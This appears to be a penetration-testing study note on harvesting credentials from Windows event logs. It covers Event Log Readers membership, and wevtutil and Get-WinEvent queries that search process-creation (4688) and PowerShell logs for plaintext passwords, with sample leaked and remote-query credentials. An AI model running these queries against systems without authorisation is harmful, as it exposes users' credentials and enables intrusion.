## Key Points

- **4688** = process creation event.
- If command-line auditing is enabled, commands + possible **plaintext passwords** are logged.
- **Event Log Readers** can read event logs without admin.
- Look for commands like `net use`, `tasklist`, `ipconfig`, `systeminfo`, etc.

## Check Membership

```
net localgroup "Event Log Readers"
```

## Search Security Log — `wevtutil`

```
wevtutil qe Security /rd:true /f:text | Select-String "/user"
```

Look for leaked credentials:

```
net use T: \\fs01\backups /user:tim MyStr0ngP@ssword
```

### Remote Host

```
wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
```

- `/r:` remote host
- `/u:` username
- `/p:` password

## `Get-WinEvent`

Find **4688** events containing `/user`:

```
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
```

> `Get-WinEvent` Security log access requires **admin/registry permissions**; Event Log Readers alone is insufficient.

## Also Check

**PowerShell Operational** logs → may contain credentials if **Script Block/Module Logging** is enabled.
